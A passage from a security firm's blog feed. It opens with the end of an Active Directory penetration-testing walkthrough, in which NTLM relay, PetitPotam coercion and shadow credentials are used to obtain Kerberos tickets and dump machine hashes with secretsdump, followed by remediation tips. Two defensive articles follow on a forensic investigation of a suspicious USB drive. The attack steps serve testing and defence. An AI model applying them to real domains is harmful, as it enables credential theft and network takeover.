&lt;p&gt;After choosing ‘ekennedy’ we can now impersonate them by using our new machine account username and password via the getST.py command from impacket.&lt;/p&gt;
&lt;p&gt;&lt;figure&gt;
    &lt;img src=&#34;images/18.png&#34; title=&#34;18&#34; alt=&#34;18&#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;18&lt;/figcaption&gt;
  &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;This will provide us an ‘ekennedy’ service ticket (a.k.a. silver ticket) for the cifs service on that specific machine, which can’t be used elsewhere.&lt;/p&gt;
&lt;p&gt;We can import this into our Kali memory as so:&lt;/p&gt;
&lt;p&gt;&lt;figure&gt;
    &lt;img src=&#34;images/19.png&#34; title=&#34;19&#34; alt=&#34;19&#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;19&lt;/figcaption&gt;
  &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;We can then use this ticket in various tools by specifying the ‘-k’ flag on the command line, so it will grab the ticket directly from that KRB5CCNAME variable we set.&lt;/p&gt;
&lt;p&gt;Here I use &lt;a href=&#34;https://github.com/fortra/impacket/blob/master/examples/secretsdump.py&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;secretsdump&lt;/a&gt; to now dump the hashes from the machines memory which, like passwords, we can use to access the machine as an Administrator, for example:&lt;/p&gt;
&lt;p&gt;&lt;figure&gt;
    &lt;img src=&#34;images/20.png&#34; title=&#34;20&#34; alt=&#34;20&#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;20&lt;/figcaption&gt;
  &lt;/figure&gt;&lt;/p&gt;
&lt;h3&gt;&lt;strong&gt;LDAP Signing - Shadow Credentials&lt;/strong&gt;&lt;span class=&#34;absolute -mt-20&#34; id=&#34;ldap-signing---shadow-credentials&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#ldap-signing---shadow-credentials&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;This technique is very very similar to the previous one so I will cover it in less detail. The key benefit to using this one is that it isn’t reliant on creating a new machine on the network, which can be useful when some organisations have the ‘Machine Account Quota’ set to zero. Remember that, by default,  regular AD users are allowed to add 10, which is crazy!&lt;/p&gt;
&lt;p&gt;This technique allows an attacker to take over an AD computer account if we can modify the computer’s attribute ‘msDS-KeyCredentialLink’ and append it with alternate credentials in the form of a certificate which we have control over. This certificate will then allow us to have control over that machine.&lt;/p&gt;
&lt;p&gt;So once again we set up our trusty ntlmrelayx to target ‘KENNEDY-DC’ with no LDAP signing in place but specifying two different flags. They are shadow credentials to tell it what attack we are doing, then a shadow-target to specify the machine we are targeting. The machine we are targeting in this case is again the ‘KENNEDY-CA’ machine with the WebClient running, so we can coerce it towards us as shown previously.&lt;/p&gt;
&lt;p&gt;&lt;figure&gt;
    &lt;img src=&#34;images/22.png&#34; title=&#34;22&#34; alt=&#34;22&#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;22&lt;/figcaption&gt;
  &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;We again use Responder to provide a machine name and &lt;a href=&#34;https://github.com/topotam/PetitPotam&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;PetitPotam&lt;/a&gt; to carry out the coercion back to us as shown:&lt;/p&gt;
&lt;p&gt;&lt;figure&gt;
    &lt;img src=&#34;images/23.png&#34; title=&#34;23&#34; alt=&#34;23&#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;23&lt;/figcaption&gt;
  &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;Once again ntlmrelayx gets a hit but this time instead of being able to impersonate anybody else on the victim machine we receive a certificate for the machine account.&lt;/p&gt;
&lt;p&gt;&lt;figure&gt;
    &lt;img src=&#34;images/24.png&#34; title=&#34;24&#34; alt=&#34;24&#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;24&lt;/figcaption&gt;
  &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;Quite handily above, ntlmrelayx provides the command to use next with the tool &lt;a href=&#34;https://github.com/dirkjanm/PKINITtools/blob/master/gettgtpkinit.py&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;gettgtpkinit.py&lt;/a&gt; to convert the certificate into a TGT (Ticket Granting Ticket) for the machine. A TGT is just as good as a username and password in the Kerberos world so we can use that to act as the machine we are attacking.&lt;/p&gt;
&lt;p&gt;After running that command the TGT is saved to file:&lt;/p&gt;
&lt;p&gt;&lt;figure&gt;
    &lt;img src=&#34;images/25.png&#34; title=&#34;25&#34; alt=&#34;25&#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;25&lt;/figcaption&gt;
  &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;Once again we import it into our variable to be used by our tools:&lt;/p&gt;
&lt;p&gt;&lt;figure&gt;
    &lt;img src=&#34;images/26.png&#34; title=&#34;26&#34; alt=&#34;26&#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;26&lt;/figcaption&gt;
  &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;Then once again run secretsdump with the ‘-k’ flag to use the TGT to dump all the hashes of the machine, allowing us a complete takeover.&lt;/p&gt;
&lt;p&gt;&lt;figure&gt;
    &lt;img src=&#34;images/27.png&#34; title=&#34;27&#34; alt=&#34;27&#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;27&lt;/figcaption&gt;
  &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;Well, that completes my little foray into some of the older adversary techniques that have helped me compromise countless Active Directory environments. Whilst older, these are still very real-world and usable attack paths so hopefully this provides the testers out there with some added insights and the defenders with some visibility over attack paths adversaries may take in their Active Directory domains.&lt;/p&gt;
&lt;p&gt;Some remediation steps that you can take to hinder these attacks in your domain are:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Enabling SMB signing&lt;/li&gt;
&lt;li&gt;Enabling LDAP signing&lt;/li&gt;
&lt;li&gt;Set the ‘Machine Account Quota’ to zero&lt;/li&gt;
&lt;li&gt;Try to move away from NTLM to Kerberos&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Until next time.&lt;/p&gt;

      </description>
    </item>
    
    <item>
      <title>Building Forensic Expertise: A Two-Part Guide to Investigating a Malicious USB Device (Part 2)</title>
      <link>//localhost:1313/articles/2024/09/2024-09-11-building-forensic-expertise-a-two-part-guide-to-investigating-a-malicious-usb-device-part-2/</link>
      <pubDate>Wed, 11 Sep 2024 00:00:00 +0000</pubDate>
      
      <guid>//localhost:1313/articles/2024/09/2024-09-11-building-forensic-expertise-a-two-part-guide-to-investigating-a-malicious-usb-device-part-2/</guid>
      <description>
        
        
        &lt;p&gt;In this part 2, we&amp;rsquo;ll walk you through the step-by-step process of setting up and conducting a Digital Forensics and Incident Response (DFIR) investigation using a virtual machine (VM). We’ll cover everything from configuring the VM to ensure it’s completely isolated to tackling the challenges of USB passthrough with a write blocker. You&amp;rsquo;ll also learn about the risks of using public threat intelligence platforms like VirusTotal and discover alternative methods for secure file analysis.&lt;/p&gt;
&lt;p&gt;Our goal is to share practical experiences and lessons learned from our investigation, offering useful insights and tips for anyone new to the field or looking to refine their DFIR skills. Whether you&amp;rsquo;re a seasoned pro or just starting out, this article provides a clear and detailed look at best practices and important considerations in digital forensics and incident response.&lt;/p&gt;
&lt;p&gt;&lt;figure&gt;
    &lt;img src=&#34;images/1.gif&#34; title=&#34;1&#34; alt=&#34;1&#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;1&lt;/figcaption&gt;
  &lt;/figure&gt;&lt;/p&gt;
&lt;h3&gt;&lt;strong&gt;Setting Up the Virtual Machine&lt;/strong&gt;&lt;span class=&#34;absolute -mt-20&#34; id=&#34;setting-up-the-virtual-machine&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#setting-up-the-virtual-machine&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;Muhammad&lt;/strong&gt; was responsible for continuing the investigation by extracting data from the USB stick using a write blocker and a virtual machine.&lt;/p&gt;
&lt;p&gt;Setting up the VM for this DFIR investigation is mostly straightforward, thanks to prior experience with virtual machines. We used VMware Workstation Pro with a Windows 11 environment. However, there were some challenges.&lt;/p&gt;
&lt;p&gt;We configured the VM to block data transfer between the VM and the host system with the detailed steps below. This step is crucial for preventing data leaks, preventing malware from spreading. It protects against accidental data leaks and tampering of the evidence, ensuring the integrity of the investigation by segregation the Virtual Machine environment from the host environment.&lt;/p&gt;
&lt;p&gt;To achieve this, disable shared folders and other options that could potentially allow data exchange between the VM and the host. Here’s how to do it:&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;1. Disable Shared Folders:&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;ul&gt;
&lt;li&gt;Go to the VM settings.
&lt;ul&gt;
&lt;li&gt;Navigate to the &amp;ldquo;Options&amp;rdquo; tab.&lt;/li&gt;
&lt;li&gt;Select &amp;ldquo;Shared Folders&amp;rdquo; and set it to &amp;ldquo;Disabled.&amp;rdquo;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;figure&gt;
    &lt;img src=&#34;images/2.png&#34; title=&#34;2&#34; alt=&#34;2&#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;2&lt;/figcaption&gt;
  &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt; &lt;/p&gt;
&lt;p&gt;&lt;strong&gt;2. Disable Drag-and-Drop and Copy-Paste:&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;ul&gt;
&lt;li&gt;Still under the &amp;ldquo;Options&amp;rdquo; tab, select &amp;ldquo;Guest Isolation.&amp;rdquo;
&lt;ul&gt;
&lt;li&gt;Uncheck both &amp;ldquo;Enable drag and drop&amp;rdquo; and &amp;ldquo;Enable copy and paste.&amp;rdquo;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt; &lt;/p&gt;
&lt;p&gt;&lt;figure&gt;
    &lt;img src=&#34;images/3.png&#34; title=&#34;3&#34; alt=&#34;3&#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;3&lt;/figcaption&gt;
  &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt; &lt;/p&gt;
&lt;p&gt;Additionally, disable the VM&amp;rsquo;s internet connection to ensure the VM is not connected to the internet. This precaution was necessary since the contents of the USB were unknown, and wanted to prevent any potential malicious activity from communicating with external networks. To achieve this the following steps should be followed&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;3. Disable the internet in VMware Workstation&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;ul&gt;
&lt;li&gt;Right-click the VM and select Settings.
&lt;ul&gt;
&lt;li&gt;Go to the Hardware tab and select Network Adapter.&lt;/li&gt;
&lt;li&gt;Uncheck “Connected” and “Connect at power on”.&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;figure&gt;
    &lt;img src=&#34;images/4.png&#34; title=&#34;4&#34; alt=&#34;4&#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;4&lt;/figcaption&gt;
  &lt;/figure&gt;&lt;/p&gt;
&lt;h3&gt;&lt;strong&gt;USB Passthrough and Write Blocker Integration&lt;/strong&gt;&lt;span class=&#34;absolute -mt-20&#34; id=&#34;usb-passthrough-and-write-blocker-integration&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#usb-passthrough-and-write-blocker-integration&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;Getting USB passthrough to work with the write blocker presented its own set of challenges. Initially, when we connected the USB to the write blocker and passed it through to the VM, there was no response from the virtual machine. After some troubleshooting, discovered that we needed to adjust the USB settings within VMware Workstation Pro to ensure proper recognition of the device.&lt;/p&gt;
&lt;p&gt;Here&amp;rsquo;s how to do it:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;Adjust USB Compatibility:&lt;/strong&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;ul&gt;
&lt;li&gt;In the VM settings, navigate to the &amp;ldquo;USB Controller&amp;rdquo; option.
&lt;ul&gt;
&lt;li&gt;Set the &amp;ldquo;USB compatibility&amp;rdquo; to USB 2.0 or 3.0, depending on the write blocker’s compatibility.&lt;/li&gt;
&lt;li&gt;Enable &amp;ldquo;Show all USB input devices&amp;rdquo; to ensure the VM detects the write blocker.&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Manually Connect the USB Device:&lt;/strong&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;ul&gt;
&lt;li&gt;After booting the VM, go to the &amp;ldquo;VM&amp;rdquo; menu in VMware Workstation.
&lt;ul&gt;
&lt;li&gt;Select &amp;ldquo;Removable Devices,&amp;rdquo; then find the USB device, and click &amp;ldquo;Connect (Disconnect from Host).&amp;rdquo; This action passes the USB device directly to the VM, bypassing the host system.&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;These steps were essential in ensuring that the USB device was correctly recognized by the VM through the write blocker, allowing us to proceed with the forensic analysis.&lt;/p&gt;
&lt;p&gt;&lt;figure&gt;
    &lt;img src=&#34;images/5.png&#34; title=&#34;5&#34; alt=&#34;5&#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;5&lt;/figcaption&gt;
  &lt;/figure&gt;&lt;/p&gt;
&lt;h3&gt;&lt;strong&gt;Integrating the Write Blocker&lt;/strong&gt;&lt;span class=&#34;absolute -mt-20&#34; id=&#34;integrating-the-write-blocker&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#integrating-the-write-blocker&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;The integration of the write blocker was a critical step in ensuring that the data on the USB drive remained unaltered during the investigation. We used AccessData FTK Imager for this task, a trusted tool in the DFIR community for acquiring and analysing digital evidence. The write blocker was necessary to prevent any accidental writes or modifications to the USB drive, which could compromise the integrity of the evidence.&lt;/p&gt;
&lt;p&gt;&lt;figure&gt;
    &lt;img src=&#34;images/6.png&#34; title=&#34;6&#34; alt=&#34;6&#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;6&lt;/figcaption&gt;
  &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;A challenge that we faced was ensuring that the write blocker was properly connected and recognized by both the VM and FTK Imager. This required carefully following the correct sequence of connections: first plugging the USB into the write blocker, then connecting the write blocker to the host machine, and finally configuring the VM to recognize the USB device as described earlier.&lt;/p&gt;
&lt;h3&gt;&lt;strong&gt;Threat Intelligence Research&lt;/strong&gt;&lt;span class=&#34;absolute -mt-20&#34; id=&#34;threat-intelligence-research&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#threat-intelligence-research&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;Marin&lt;/strong&gt; was responsible for researching the data collected from the USB (file hashes) through various threat intelligence platforms.&lt;/p&gt;
&lt;p&gt;&lt;figure&gt;
    &lt;img src=&#34;images/7.png&#34; title=&#34;7&#34; alt=&#34;7&#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;7&lt;/figcaption&gt;
  &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;Here, we’ll learn about the risks of uploading files to VirusTotal and explore alternative analysis methods. Uploading files to VirusTotal can be risky because this popular threat intelligence platform is public, meaning that any files you upload and their analysis results can be seen and downloaded by users with premium VT subscriptions - from cybersecurity professionals to researchers and even malicious threat actors. This visibility could unintentionally expose sensitive information or proprietary data. If the files are unique to your organisation, uploading them could alert adversaries to potential vulnerabilities or ongoing investigations, compromising your security measures.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Potential Risks:&lt;/strong&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;Exposure of Sensitive Data:&lt;/strong&gt; Uploading files with confidential information to VirusTotal can lead to unintended disclosure.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Intellectual Property Theft:&lt;/strong&gt; Other companies or competitors might reverse-engineer proprietary software or unique data structures.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Targeted Attacks:&lt;/strong&gt; Malicious threat actors monitoring VirusTotal could use the information to launch targeted attacks against your organisation.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Legal and Compliance Issues:&lt;/strong&gt; Uploading certain files might breach data protection regulations and policies.&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;To avoid these risks, we considered alternative methods for analysing files. One effective approach is using private sandbox environments. Sandboxing means running files in an isolated, controlled setting to observe their behaviour without risking the security of your broader network. This method allows for a thorough analysis of potential threats while keeping sensitive data secure and under control.&lt;/p&gt;
&lt;p&gt;One sandboxing option is &lt;a href=&#34;https://github.com/mandiant/flare-vm&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;FLARE VM&lt;/a&gt;, a collection of software installed on top of Windows VM. Once running some flare vm script to install tools, it will allow you to maintain a reverse engineering environment on a VM, for malware analysis, incident response, and forensic analysis.&lt;/p&gt;
&lt;p&gt;&lt;figure&gt;
    &lt;img src=&#34;images/8.png&#34; title=&#34;8&#34; alt=&#34;8&#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;8&lt;/figcaption&gt;
  &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt; &lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Importance of Private Sandboxing:&lt;/strong&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;Confidentiality:&lt;/strong&gt; Keeps sensitive files and analysis results within your organisation.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Customization:&lt;/strong&gt; You can tailor the sandbox environment to closely mimic your actual network, providing more relevant insights.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;In-Depth Analysis:&lt;/strong&gt; Allows for detailed behavioural analysis of files, uncovering sophisticated or previously unknown threats that simple hash comparisons might miss.&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;Another way to mitigate risk is by testing the hash of a file instead of uploading the entire file. A hash generates a unique identifier representing the file’s contents without revealing the actual data, allowing for secure and private verification against known threat databases.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Benefits of Testing Hashes:&lt;/strong&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;Privacy Preservation:&lt;/strong&gt; Hashes don’t expose the actual file content, maintaining confidentiality.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Efficiency:&lt;/strong&gt; Comparing hashes is less computationally intensive than analysing full files.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Integrity Verification:&lt;/strong&gt; Hashes confirm that files haven’t been altered, ensuring data integrity.&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;strong&gt;SHA-256&lt;/strong&gt;, which stands for Secure Hash Algorithm 256-bit, is a cryptographic hash function that produces a fixed-size, 256-bit hash value from an input of any size. The use of a hash varies depending on the scenario; it can be used to confirm whether the content of two files is identical, or in this case, whether the file the hash belongs to has been reported as malicious previously, and to check the file’s originality by comparing the hash against threat intelligence platforms, such as VirusTotal.&lt;/p&gt;
&lt;p&gt;The good news was that the SHA-256 hashes did not match any known malicious files in VirusTotal’s extensive database, but we still couldn’t determine its origin. Despite this initial relief, we conducted further analysis to ensure the files were safe.&lt;/p&gt;
&lt;h3&gt;&lt;strong&gt;Further Investigation: Antivirus Scan&lt;/strong&gt;&lt;span class=&#34;absolute -mt-20&#34; id=&#34;further-investigation-antivirus-scan&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#further-investigation-antivirus-scan&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;Next, we ran an antivirus scan and a static analysis on the files. Both analyses aimed to ensure the files were not malicious. Antivirus scans look for patterns based on the signatures or definitions of known malware, while static analysis involves examining the code without executing the program. This method helps identify potential threats by analysing the file structure and content.&lt;/p&gt;
&lt;p&gt;The antivirus scan didn’t discover any indications of infection and confirmed that the files did not contain any malicious features. The results of the static analysis echoed that.&lt;/p&gt;
&lt;p&gt;By now, the files appeared to be non-malicious, so we could finally open them to see what they actually were!&lt;/p&gt;
&lt;h3&gt;&lt;strong&gt;Final Investigation: Examining the Files&amp;rsquo; Content&lt;/strong&gt;&lt;span class=&#34;absolute -mt-20&#34; id=&#34;final-investigation-examining-the-files&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#final-investigation-examining-the-files&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;Voila! Guess what the content of the files was? They were… two different files! :)&lt;/p&gt;
&lt;p&gt;Since we aim to share knowledge applicable to general scenarios, we won’t dive into specifics here. However, a general rule of thumb to determine if the content is malicious (especially after running scans like antivirus and static analysis with no concerning results) is to understand what might be expected or unexpected for the client, and whether phishing could be a possible threat based on the content. That was the approach we used for examining the files&amp;rsquo; content.&lt;/p&gt;
&lt;p&gt;For example, a company might expect an email with remittance details from its supplier. This is relevant to the company and involves potential risks, such as when someone impersonating the supplier sends an email that appears to be remittance-related, embedding a link that supposedly directs you to a remittance document, but instead leads to a phishing page designed to deceive you into entering your credentials.&lt;/p&gt;
&lt;p&gt;The two files appeared to be related to a project the client was working on at that moment. The information and tone of language used in the files suggested the sender was purely offering their advice on the project. Although it wasn’t something the client was expecting, we believed we had identified the origin and purpose of the USB drive.&lt;/p&gt;
&lt;p&gt;&lt;figure&gt;
    &lt;img src=&#34;images/9-ezgif.com-crop.gif&#34; title=&#34;9&#34; alt=&#34;9 ezgif.com crop&#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;9&lt;/figcaption&gt;
  &lt;/figure&gt;&lt;/p&gt;
&lt;h3&gt;&lt;strong&gt;Verdict: A Clean Bill of Health&lt;/strong&gt;&lt;span class=&#34;absolute -mt-20&#34; id=&#34;verdict-a-clean-bill-of-health&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#verdict-a-clean-bill-of-health&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;At this point, we’d conducted several analyses, and by piecing all the results together, we concluded that the USB drive was not malicious. If it had been a computer that needed investigating, we would have also analysed unusual registry entries or network connections to known malicious servers.&lt;/p&gt;
&lt;p&gt;Throughout the entire investigation, we kept the client in the loop, informing them of the process at each stage. Clear communication is essential in any DFIR investigation, and clients might also provide valuable information that could assist the investigation.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Key Takeaways and Lessons Learned&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Although the files on the USB drive were not malicious—which was definitely a relief—we still gained valuable experience by conducting an incident investigation from start to finish, all under the guidance of an experienced team. As rookies, we learned how to preserve evidence in line with best practices, utilise various tools, leverage threat intelligence, and maintain a proper chain of custody to draw meaningful conclusions.&lt;/p&gt;
&lt;p&gt;Through this process, we discovered several critical lessons:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Importance of Isolation&lt;/strong&gt;: Isolating the VM from the host system and external networks is crucial when handling unknown devices. This step prevents potential contamination or compromise of the main system.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Attention to Detail in Settings&lt;/strong&gt;: Correctly configuring the VM and USB passthrough settings is essential. Small oversights can lead to significant delays or even jeopardise the investigation.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Familiarity with Tools&lt;/strong&gt;: Being well-versed with forensic tools like FTK Imager and knowing how to use a write blocker properly can significantly enhance the efficiency and accuracy of the investigation.&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;&lt;strong&gt;Advice for Beginners&lt;/strong&gt;&lt;span class=&#34;absolute -mt-20&#34; id=&#34;advice-for-beginners&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#advice-for-beginners&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;For anyone attempting this process for the first time, here are some tips:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Double-Check VM Settings:&lt;/strong&gt; Before starting your investigation, make sure to disable any features that allow data exchange between your VM and the host system, and disconnect the VM from the internet.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;USB Passthrough Troubleshooting:&lt;/strong&gt; If your USB device isn’t being recognized, check the USB compatibility settings in your VM. Also, manually connect the USB device through the VMware menu to ensure proper passthrough.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Understand Your Tools:&lt;/strong&gt; Take the time to familiarise yourself with both the write blocker and the forensic tools you’re using. This knowledge will help you avoid mistakes that could compromise your investigation.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Stay Patient and Methodical:&lt;/strong&gt; DFIR work requires a lot of patience and attention to detail. Rushing through steps or skipping checks can lead to errors that are difficult to correct later on.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;All of these experiences broadened our horizons and provided a better understanding of the DFIR world, which will definitely benefit us in the long term. We hope this article provided some insights, especially for those interested in cybersecurity or someone who, like us, is just starting their career in the field. We also hope you enjoyed the read as much as we enjoyed our first investigation! :)&lt;/p&gt;
&lt;p&gt;&lt;em&gt;Disclaimer: The incident response case described in this blog is based on a real event. However, specific details, including the names, locations, and other identifying information of the organisation involved, have been altered to protect their privacy and confidentiality. Any resemblance to actual events or entities is purely coincidental.&lt;/em&gt;&lt;/p&gt;

      </description>
    </item>
    
    <item>
      <title>Building Forensic Expertise: A Two-Part Guide to Investigating a Malicious USB Device (Part 1)</title>
      <link>//localhost:1313/articles/2024/08/2024-08-28-building-forensic-expertise-a-two-part-guide-to-investigating-a-malicious-usb-device-part-1/</link>
      <pubDate>Wed, 28 Aug 2024 00:00:00 +0000</pubDate>
      
      <guid>//localhost:1313/articles/2024/08/2024-08-28-building-forensic-expertise-a-two-part-guide-to-investigating-a-malicious-usb-device-part-1/</guid>
      <description>
        
        
        &lt;p&gt;JUMPSEC believes heavily in learning and developing through real world experience. The incident described in this blog post presented a fantastic opportunity for 3 junior team members to learn first hand how to conduct, report and respond to an incident investigation. This blog post is split into two parts: Part I focuses on the prerequisites and preparation work done before kicking off the investigation, such as explaining the forensic principles used in the investigation, how the evidence is preserved and introducing tools deployed. Part 2 emphasises on how we utilise the tools to conduct the investigation and how we assemble all the available evidence to conclude the investigation.&lt;/p&gt;
&lt;p&gt;Imagine, you come into work one morning to find a mysterious USB drive on your desk. It’s not addressed to anyone in particular and no note is left to explain its origin. What would you do?&lt;/p&gt;
&lt;p&gt;&lt;figure&gt;
    &lt;img src=&#34;images/1png.png&#34; title=&#34;1&#34; alt=&#34;1&#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;1&lt;/figcaption&gt;
  &lt;/figure&gt;&lt;figure&gt;
    &lt;img src=&#34;images/2.png&#34; title=&#34;2&#34; alt=&#34;2&#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;2&lt;/figcaption&gt;
  &lt;/figure&gt; The suspicious USB&lt;/p&gt;
&lt;p&gt;This is what happened to an organisation early this year. To conduct an investigation into the mystery USB drive they contacted JUMPSEC!&lt;/p&gt;
&lt;p&gt;In this blogpost, we walk you through a real case of an unexpected USB drive mailed in to an organisation, showing the step-by-step process of how a Digital Forensics and Incident Response (DFIR) investigation was carried out, what principles and tools were used, and the perspectives from three rookies in the cyber security field doing their first investigation!&lt;/p&gt;
&lt;p&gt;This is how it all began….&lt;/p&gt;
&lt;h3&gt;Preparation&lt;span class=&#34;absolute -mt-20&#34; id=&#34;preparation&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#preparation&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;h3&gt;&lt;figure&gt;
    &lt;img src=&#34;images/3.gif&#34; title=&#34;3&#34; alt=&#34;3&#34; loading=&#34;lazy&#34; /&gt;
